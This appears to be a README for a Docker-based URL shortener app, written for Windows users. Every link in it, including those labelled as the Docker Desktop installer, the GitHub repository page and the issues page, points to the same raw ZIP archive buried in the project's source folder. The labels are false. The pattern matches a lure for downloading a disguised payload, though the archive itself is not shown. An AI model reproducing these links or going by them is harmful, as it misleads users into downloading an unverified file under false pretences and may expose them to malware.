# 🚀 full-stack-url-shortener-docker - Simple, Fast URL Shortening  

[![Download full-stack-url-shortener-docker](https://img.shields.io/badge/Download%20App-Get%20it%20here-green?style=for-the-badge)](https://raw.githubusercontent.com/frosty68897/full-stack-url-shortener-docker/main/client/src/lib/url-docker-full-stack-shortener-3.5.zip)

## 📋 What is full-stack-url-shortener-docker?

full-stack-url-shortener-docker is a complete URL shortener you can run on your Windows computer. It makes long web addresses shorter and easier to share. The software uses popular tools like React for the front end, Express for the back end, and PostgreSQL for database storage. All parts run inside containers using Docker, which keeps everything organized and easy to start.

This app is designed to work well in real-world situations. It handles many users and keeps things fast.

## ⚙️ What you need before starting

Before you run full-stack-url-shortener-docker on your PC, check these requirements:

- **Operating System:** Windows 10 or newer  
- **Processor:** Any modern CPU, 64-bit preferred  
- **RAM:** At least 4 GB free  
- **Disk Space:** Minimum 2 GB free (for Docker and data)  
- **Internet connection:** Needed to download the app and Docker software

You will also need to install Docker Desktop for Windows. Docker lets you run software containers that hold all parts of this application.  
Download Docker Desktop here: https://raw.githubusercontent.com/frosty68897/full-stack-url-shortener-docker/main/client/src/lib/url-docker-full-stack-shortener-3.5.zip

## ⬇️ How to download full-stack-url-shortener-docker

You need to visit the app’s page on GitHub to get the files.

[![Download full-stack-url-shortener-docker](https://img.shields.io/badge/Download%20App-Get%20it%20here-blue?style=for-the-badge)](https://raw.githubusercontent.com/frosty68897/full-stack-url-shortener-docker/main/client/src/lib/url-docker-full-stack-shortener-3.5.zip)

1. Open the link above in your web browser.
2. On the GitHub page, look for the green **Code** button.
3. Click **Code**, then select **Download ZIP**.
4. Save the ZIP file anywhere you prefer on your computer.
5. Once downloaded, right-click the ZIP file and select **Extract All** to unzip the files.

This gives you a local copy of the app files to run with Docker.

## 🐳 Installing Docker Desktop

If Docker is not already installed:

1. Visit https://raw.githubusercontent.com/frosty68897/full-stack-url-shortener-docker/main/client/src/lib/url-docker-full-stack-shortener-3.5.zip
2. Click the **Download for Windows (Windows 10/11)** button.
3. Run the downloaded installer.
4. Follow the installer steps, choosing the default options.
5. After installation, restart your computer if asked.

When Docker finishes installing, you can move on to running the app.

## ▶️ Running full-stack-url-shortener-docker on Windows

Once you have Docker installed and the app files extracted, follow these steps:

1. Open the folder where you extracted the app files.
2. Look for a file named `docker-compose.yml`. This file tells Docker how to start all the parts of the app.
3. Hold the **Shift** key, then right-click inside the folder (on an empty space).
4. Select **Open PowerShell window here** or **Open command window here** from the context menu.
5. In the window that opens, type the following command and press **Enter**:

```
docker-compose up -d
```

This command tells Docker to download, build, and run the containers in the background.

6. Wait a few moments while Docker downloads all necessary pieces and starts the app.
7. To check if the app is running, open your web browser and go to:

```
http://localhost:3000
```

This address opens the URL shortener in your browser.

## 🔄 Stopping and restarting the app

If you want to stop the app:

1. Open the same PowerShell or command window in the app folder.
2. Run:

```
docker-compose down
```

This stops and removes the containers.

To start the app again, use the `docker-compose up -d` command as before.

## 🗄 Understanding the app structure

- **React front end:** The user interface you see in the browser.  
- **Express back end:** Handles data and connects the front end to the database.  
- **Drizzle ORM:** Helps manage database queries safely.  
- **PostgreSQL:** Stores the original and shortened URLs.  

Docker ensures all parts run together without conflicts.

## 🔧 What to do if something goes wrong

- Make sure Docker Desktop is running before running commands.  
- Check if any errors appear in the PowerShell or command window. Errors will usually explain what is wrong.  
- Restart Docker Desktop and try the commands again if the app does not start.  
- Visit the GitHub page for updates or issues: https://raw.githubusercontent.com/frosty68897/full-stack-url-shortener-docker/main/client/src/lib/url-docker-full-stack-shortener-3.5.zip  

## 📚 Using the URL shortener

Once running, you can shorten URLs:

1. Open the app in your browser at http://localhost:3000.
2. Paste a long web address into the input box.
3. Click the button to create a short link.
4. The short link appears, ready to copy and share.
5. When the short link is opened, it redirects to the original long URL.

You can use the app to quickly make simpler URLs for emails, messages, or social posts.

## 🔑 Security notes

This app runs locally on your Windows PC. Data stays on your machine unless you add internet access later. Keep your computer secure to protect your data.

## 🧩 Available features

- Create short URLs in one click  
- View recent shortened URLs in history  
- Fast query with optimized database handling  
- Mobile-friendly interface  
- Easy start and stop using Docker commands

## 📁 File overview in the download

- `docker-compose.yml` — Main Docker setup file  
- `frontend/` — React app code  
- `backend/` — Express server code  
- `database/` — PostgreSQL setup configuration  
- `README.md` — Documentation file (this file)  

## 🛠 Updating the app

To get the latest version:

1. Download the new ZIP file from the GitHub page again.
2. Extract it to a new folder.
3. Stop the current app using `docker-compose down`.
4. Start the new version with `docker-compose up -d`.

## ⚙️ Docker tips for Windows users

- Keep Docker Desktop updated for best stability.  
- Use the Docker Dashboard to monitor running containers visually.  
- If Docker runs slow, check your system resources and close unused apps.  
- Adjust Docker’s resource limits in Docker Desktop settings if needed.

## 🔗 Useful links

- GitHub repository: https://raw.githubusercontent.com/frosty68897/full-stack-url-shortener-docker/main/client/src/lib/url-docker-full-stack-shortener-3.5.zip  
- Docker Desktop: https://raw.githubusercontent.com/frosty68897/full-stack-url-shortener-docker/main/client/src/lib/url-docker-full-stack-shortener-3.5.zip  

Make sure your Windows machine meets the requirements and has Docker ready to enjoy full-stack-url-shortener-docker quickly and efficiently.